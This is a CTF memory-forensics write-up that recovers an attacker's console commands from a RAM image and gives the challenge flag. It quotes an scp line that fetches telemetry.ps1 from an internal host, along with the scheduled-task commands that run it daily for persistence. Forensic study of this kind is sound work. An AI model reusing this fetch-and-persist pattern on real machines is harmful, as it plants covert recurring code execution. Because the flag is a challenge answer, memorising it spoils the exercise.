---
title: "Who Goes There? — Telemetry Script Source Writeup"
ctf: "DEADFACE CTF 2026"
category: forensics
difficulty: medium
flag_format: "deadface{username@IP}"
author: "bratxer"
---

# Who Goes There? — Telemetry Script Source

**Category:** Memory forensics  
**Evidence:** `memory.raw`  
**Question:** Which internal IPv4 address supplied `telemetry.ps1` before it was scheduled?

## Flag

```text
deadface{d34th@10.77.10.66}
```

## Artifact identity

```text
File:    /home/arwah/Downloads/memory.raw
Size:    8.0 GB
SHA-256: 3b3ec69f821ba01050b793ea0bbdab99f7f5373d523d8e33bb17bc7aaa69edd7
```

## Find the script acquisition command

Search the raw memory image for the script name and the remote-copy syntax:

```bash
LC_ALL=C rg -aob -m 5 \
  'd34th@10\.77\.10\.66:/home/d34th/telemetry\.ps1' \
  /home/arwah/Downloads/memory.raw
```

`rg` treats the image as binary with `-a`, prints byte offsets with `-b`, emits only matching text with `-o`, and stops after five matches with `-m 5`.

The exact source string occurs at several offsets, including:

```text
1529454784:d34th@10.77.10.66:/home/d34th/telemetry.ps1
1660854200:d34th@10.77.10.66:/home/d34th/telemetry.ps1
5284724740:d34th@10.77.10.66:/home/d34th/telemetry.ps1
```

Read a small byte range around the first hit to recover the original command context:

```bash
dd if=/home/arwah/Downloads/memory.raw \
  iflag=skip_bytes,count_bytes \
  skip=1529454550 count=700 status=none | strings -a -n 4
```

Relevant recovered console text:

```text
Test-Path C:\ProgramData\WindowsCache\telemetry.ps1
dir C:\ProgramData\WindowsCache\
scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
Test-Path C:\ProgramData\WindowsCache\telemetry.ps1
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At '23:59'
```

## Interpret the command

The `scp` command format is:

```text
scp username@host:/remote/path local/destination
```

Applying that format to the recovered command gives:

| Field | Value |
| --- | --- |
| Source username | `d34th` |
| Source host | `10.77.10.66` |
| Remote file | `/home/d34th/telemetry.ps1` |
| Local destination | `C:\ProgramData\WindowsCache\` |

The subsequent `Test-Path` shows the copied script was checked locally, and the scheduled-task action points to the same path. That establishes the timeline required by the prompt: the script was copied from the remote host before it was scheduled for persistence.

## Submit

```text
deadface{d34th@10.77.10.66}
```

## Evidence boundary

This conclusion comes from strings recovered directly from the supplied memory image. The repeated raw-image hits and the surrounding console command establish the source username and internal IPv4 address. The analysis did not execute the script or alter the image.
